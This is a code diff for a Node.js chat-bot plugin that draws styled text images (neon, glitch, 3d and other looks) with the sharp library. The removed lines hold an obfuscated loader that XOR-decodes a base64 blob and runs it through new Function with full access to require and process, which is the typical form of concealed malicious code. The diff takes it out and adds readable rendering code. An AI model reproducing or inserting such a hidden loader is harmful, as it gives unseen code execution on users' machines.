@@ -1,9 +1,92 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const path = require('path');
+const { UserError, sharp, escXml } = require('../lib/util');
+
+const W = 1000, H = 420, B = 30;
+const FONT = path.join(__dirname, '..', 'assets', 'fonts', 'Poppins-Bold.ttf');
+
+const STYLES = {
+  '3d': { bg: ['#1b1b3a', '#0b0b1d'], fill: ['#ffe082', '#ff9800'], depth: { color: '#8a5200', n: 16, dx: 1, dy: 1 } },
+  angel: { bg: ['#eaf5ff', '#b6d7ff'], fill: ['#ffffff', '#fff1a8'], glow: [{ color: '#fff7b0', sigma: 16 }], stroke: { color: '#d4a82a', w: 3 } },
+  avenger: { bg: ['#0a1230', '#000000'], fill: ['#f2f2ff', '#7d86ff'], glow: [{ color: '#3d5afe', sigma: 14 }], stroke: { color: '#1a237e', w: 4 } },
+  blub: { bg: ['#06223d', '#0a4c7a'], fill: ['#9ae9ff', '#2b8cff'], glow: [{ color: '#00e5ff', sigma: 10 }], stroke: { color: '#ffffff', w: 4 } },
+  bpink: { bg: ['#000000', '#12000b'], fill: ['#ff9bd5', '#ff2e93'], glow: [{ color: '#ff2e93', sigma: 16 }], stroke: { color: '#ffffff', w: 2 } },
+  cat: { bg: ['#ffe9c7', '#ffcf8a'], fill: ['#6d4c41', '#3e2723'], stroke: { color: '#ffffff', w: 4 }, depth: { color: '#a1887f', n: 6, dx: 2, dy: 3 } },
+  glitch: { bg: ['#080808', '#080808'], fill: '#ffffff', rgb: true },
+  glitter: { bg: ['#000000', '#12081f'], fill: ['#fff3a0', '#e6a800', '#fff3a0'], glow: [{ color: '#ffd54f', sigma: 8 }], sparkle: true },
+  graffiti: { bg: ['#546e7a', '#263238'], fill: ['#ff5252', '#ffeb3b'], stroke: { color: '#000000', w: 7 }, depth: { color: '#000000', n: 8, dx: 3, dy: 3 } },
+  hacker: { bg: ['#000000', '#001a05'], fill: '#00ff41', glow: [{ color: '#00ff41', sigma: 9 }], scan: true },
+  light: { bg: ['#04040f', '#0a0a24'], fill: '#ffffff', glow: [{ color: '#ffffff', sigma: 20 }, { color: '#8fb4ff', sigma: 40 }] },
+  marvel: { bg: ['#c62828', '#8e0000'], fill: '#ffffff', stroke: { color: '#000000', w: 8 }, depth: { color: '#000000', n: 8, dx: 4, dy: 4 } },
+  neon: { bg: ['#0a0014', '#14002b'], fill: '#ffffff', glow: [{ color: '#ff00e6', sigma: 10 }, { color: '#ff00e6', sigma: 24 }, { color: '#7a00ff', sigma: 46 }] },
+  sci: { bg: ['#001524', '#000a12'], fill: ['#7df9ff', '#2979ff'], glow: [{ color: '#00e5ff', sigma: 12 }], stroke: { color: '#003c52', w: 3 }, scan: true },
+  sign: { bg: ['#4e342e', '#2e1c18'], fill: ['#fff59d', '#fbc02d'], glow: [{ color: '#ffb300', sigma: 14 }], stroke: { color: '#000000', w: 5 } },
+  tatto: { bg: ['#e3b38d', '#c68e65'], fill: '#161616', soft: true },
+  watercolor: { bg: ['#fffdf7', '#f6efe2'], fill: ['#ff6f91', '#845ec2', '#00c9a7'], soft: true, glow: [{ color: '#845ec2', sigma: 6 }] }
+};
+
+const grad = (w, h, cols) => Buffer.from(`<svg width="${w}" height="${h}" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g" x1="0" y1="0" x2="0" y2="1">${cols.map((c, i) => `<stop offset="${cols.length === 1 ? 0 : i / (cols.length - 1)}" stop-color="${c}"/>`).join('')}</linearGradient></defs><rect width="100%" height="100%" fill="url(#g)"/></svg>`);
+
+async function textMask(text) {
+  const s = sharp();
+  const t = await s({ text: { text: `<span foreground="white">${escXml(text)}</span>`, font: 'Poppins Bold', fontfile: FONT, width: W - 160, height: H - 160, align: 'centre', rgba: true } }).png().toBuffer();
+  return s({ create: { width: W, height: H, channels: 4, background: { r: 0, g: 0, b: 0, alpha: 0 } } }).composite([{ input: t, gravity: 'centre' }]).png().toBuffer();
+}
+async function fillMask(mask, fill) {
+  const s = sharp();
+  const base = Array.isArray(fill) ? s(grad(W, H, fill)) : s({ create: { width: W, height: H, channels: 4, background: fill } });
+  return base.ensureAlpha().composite([{ input: mask, blend: 'dest-in' }]).png().toBuffer();
+}
+
+async function render(text, name) {
+  const st = STYLES[name];
+  const s = sharp();
+  const mask = await textMask(text);
+  const layers = [];
+  const at = (input, dx = 0, dy = 0) => layers.push({ input, left: B + dx, top: B + dy });
+  if (st.depth) {
+    const d = await fillMask(mask, st.depth.color);
+    for (let i = st.depth.n; i >= 1; i--) at(d, i * st.depth.dx, i * st.depth.dy);
+  }
+  if (st.rgb) {
+    at(await fillMask(mask, '#00e5ff'), -7, 0);
+    at(await fillMask(mask, '#ff0055'), 7, 0);
+  }
+  for (const g of st.glow || []) {
+    const blurred = await s(await fillMask(mask, g.color)).blur(g.sigma).png().toBuffer();
+    at(blurred); at(blurred);
+  }
+  if (st.stroke) {
+    const sm = await fillMask(mask, st.stroke.color);
+    const w = st.stroke.w;
+    for (let a = 0; a < 16; a++) at(sm, Math.round(Math.cos(a * Math.PI / 8) * w), Math.round(Math.sin(a * Math.PI / 8) * w));
+  }
+  let main = await fillMask(mask, st.fill);
+  if (st.soft) main = await s(main).blur(0.9).png().toBuffer();
+  at(main);
+  if (st.sparkle) {
+    let dots = '';
+    for (let i = 0; i < 90; i++) dots += `<circle cx="${Math.random() * W}" cy="${Math.random() * H}" r="${(Math.random() * 2.2 + 0.6).toFixed(1)}" fill="#fff" opacity="${(Math.random() * 0.8 + 0.2).toFixed(2)}"/>`;
+    layers.push({ input: Buffer.from(`<svg width="${W}" height="${H}" xmlns="http://www.w3.org/2000/svg">${dots}</svg>`), left: B, top: B });
+  }
+  if (st.scan) {
+    let lines = '';
+    for (let y = 0; y < H; y += 4) lines += `<rect x="0" y="${y}" width="${W}" height="1.5" fill="#000" opacity="0.28"/>`;
+    layers.push({ input: Buffer.from(`<svg width="${W}" height="${H}" xmlns="http://www.w3.org/2000/svg">${lines}</svg>`), left: B, top: B });
+  }
+  const bg = await s(grad(W + B * 2, H + B * 2, st.bg)).png().toBuffer();
+  const composed = await s(bg).composite(layers).png().toBuffer();
+  return s(composed).extract({ left: B, top: B, width: W, height: H }).jpeg({ quality: 90 }).toBuffer();
+}
+
+module.exports = ({ def }) => {
+  for (const name of Object.keys(STYLES)) {
+    def(name, { cat: 'textmaker', heavy: true, usage: `${name} <text>`, desc: `Create a "${name}" style text image.` }, async ctx => {
+      const text = ctx.input().trim();
+      if (!text) throw new UserError(`Give me some text, e.g. *${ctx.var('PREFIX')}${name} Shadow Monarch*`);
+      if (text.length > 40) throw new UserError('Keep the text under 40 characters.');
+      await ctx.image(await render(text, name), `✨ ${name}`);
+    });
+  }
+};
+module.exports.render = render;
